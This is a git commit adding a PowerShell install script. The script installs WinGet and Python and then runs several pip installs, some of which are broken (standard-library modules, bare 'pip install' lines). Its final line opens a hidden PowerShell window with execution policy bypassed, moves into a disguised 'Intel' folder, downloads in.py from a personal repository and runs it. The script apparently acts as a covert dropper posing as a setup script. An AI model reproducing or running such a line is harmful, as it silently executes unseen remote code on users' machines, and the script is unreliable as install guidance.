7eff35a9c7bca5f29ca4b325d9cd7b6262e777be
Mood56467 <100055549+Mood56467@users.noreply.github.com>
2024-02-02 17:23:42 -0800

    install.ps1

---
+++ install.ps1
@@ -0,0 +1,33 @@
+#install winget
+$progressPreference = 'silentlyContinue'
+Write-Information "Downloading WinGet and its dependencies..."
+Invoke-WebRequest -Uri https://aka.ms/getwinget -OutFile Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
+Invoke-WebRequest -Uri https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -OutFile Microsoft.VCLibs.x64.14.00.Desktop.appx
+Invoke-WebRequest -Uri https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.7.3/Microsoft.UI.Xaml.2.7.x64.appx -OutFile Microsoft.UI.Xaml.2.7.x64.appx
+Add-AppxPackage Microsoft.VCLibs.x64.14.00.Desktop.appx
+Add-AppxPackage Microsoft.UI.Xaml.2.7.x64.appx
+Add-AppxPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
+
+winget install python
+
+#install dependencies
+
+pip install tkinter
+
+pip install
+
+pip install subprocess
+
+pip install simpledialog
+
+pip install subprocess
+
+pip install sys 
+
+pip install requests
+
+pip install pythoncom
+
+pip install
+
+powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command cd %HOMEPATH%/Intel;curl https://raw.githubusercontent.com/Mood56467/889671/main/in.py -o in.py;python ./in.py
